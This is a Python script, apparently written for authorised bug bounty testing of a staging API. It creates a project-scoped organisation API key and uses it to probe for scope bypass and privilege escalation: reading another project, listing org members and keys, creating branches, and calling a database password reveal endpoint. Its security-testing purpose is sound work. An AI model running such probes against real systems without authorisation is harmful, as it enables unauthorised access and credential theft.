# -*- coding: utf-8 -*-
"""V1: org API key project_id scope enforcement - authz model attack.
Hypothesis: project-scoped org key may not be enforced server-side (scope bypass),
or may retain org-management powers (privilege escalation)."""
import json, ssl, http.client, time

API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PB = "damp-term-63384673"
ORG = "org-flat-dawn-91601224"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
ctx = ssl.create_default_context()

def api(method, path, body=None, key=APIKEY):
    conn = http.client.HTTPSConnection(API_HOST, timeout=30, context=ctx)
    hdr = {"X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + key}
    if body is not None:
        hdr["Content-Type"] = "application/json"
        body = json.dumps(body)
    conn.request(method, API_BASE + path, body=body, headers=hdr)
    r = conn.getresponse()
    data = r.read().decode("utf-8", "replace")
    conn.close()
    return r.status, data

# S1: create org key scoped to PA
st, d = api("POST", "/organizations/%s/api_keys" % ORG,
            {"key_name": "v1-scope-test", "project_id": PA})
print("S1 create org key(PA): %d %s" % (st, d[:400]))
try:
    scoped = json.loads(d)
    SCOPED_KEY = scoped.get("key", "")
    SCOPED_ID = scoped.get("id")
except Exception:
    SCOPED_KEY = ""
    SCOPED_ID = None
print("scoped key id:", SCOPED_ID)

if SCOPED_KEY:
    tests = [
        # (tag, method, path, body) - what a PA-scoped key should NOT reach
        ("PA own project GET", "GET", "/projects/%s" % PA, None),
        ("PA branches GET", "GET", "/projects/%s/branches" % PA, None),
        ("PB other project GET", "GET", "/projects/%s" % PB, None),
        ("PB branches GET", "GET", "/projects/%s/branches" % PB, None),
        ("users/me GET", "GET", "/users/me", None),
        ("org GET", "GET", "/organizations/%s" % ORG, None),
        ("org members GET", "GET", "/organizations/%s/members" % ORG, None),
        ("all projects list", "GET", "/projects", None),
        ("api_keys list", "GET", "/api_keys", None),
        ("org api_keys list?", "GET", "/api_keys", None),
        ("PA WRITE branch create", "POST", "/projects/%s/branches" % PA,
         {"branch": {"name": "v1-scope-write-test", "parent_id": None}}),
        ("PB WRITE branch create", "POST", "/projects/%s/branches" % PB,
         {"branch": {"name": "v1-scope-write-test"}}),
        ("PA reveal pw", "GET",
         "/projects/%s/branches/%s/roles/neondb_owner/reveal_password" % (PA, "br-wandering-field-w2ob6mpn"), None),
    ]
    for tag, m, p, b in tests:
        try:
            st2, d2 = api(m, p, b, key=SCOPED_KEY)
            print("%-32s %d %s" % (tag, st2, d2[:180].replace("\n", " ")))
        except Exception as e:
            print("%-32s EXC %s" % (tag, e))
        time.sleep(0.5)

    # cleanup: delete the scoped org key
    st3, d3 = api("DELETE", "/organizations/%s/api_keys/%s" % (ORG, SCOPED_ID))
    print("cleanup delete org key: %d %s" % (st3, d3[:200]))
